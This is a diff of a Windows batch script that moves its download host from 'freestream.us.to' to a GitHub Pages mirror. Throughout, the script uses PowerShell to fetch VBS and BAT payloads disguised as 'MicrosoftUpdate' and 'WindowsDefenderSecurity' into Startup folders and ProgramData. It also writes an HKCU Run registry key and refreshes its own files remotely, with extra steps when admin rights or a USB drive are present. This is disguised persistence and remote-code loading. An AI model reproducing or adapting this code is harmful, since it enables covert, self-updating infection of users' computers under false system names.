@@ -67,7 +67,7 @@ if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdat
 )
 if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
     set "userauto=YES"
 )
 
@@ -80,7 +80,7 @@ if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftU
 if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     if "%AdminRights%"=="true" (
         copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
+        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
         set "pcauto=YES"
     ) else (
         set "pcauto=NON"
@@ -133,7 +133,7 @@ if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
 if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     mkdir "%APPDATA%/WindowsDefenderSecurity/"
     copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
     powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
     set "userregistryauto=YES"
 )
@@ -153,12 +153,12 @@ if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs"
     if "%UsbDrive%"=="true" (
         mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
         copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
-        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
+        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
     )
     if "%AdminRights%"=="true" (
         mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
         copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
-        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
+        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
     )
 
     if "%AdminRights%"=="true" (
@@ -190,15 +190,15 @@ powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebR
 
 
 rem Update all bat files
-powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
-powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
+powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
+powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
 if "%UsbDrive%"=="true" (
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
 )
 if "%AdminRights%"=="true" (
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
-    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
+    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream-us-to.github.io/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
 )
 
 
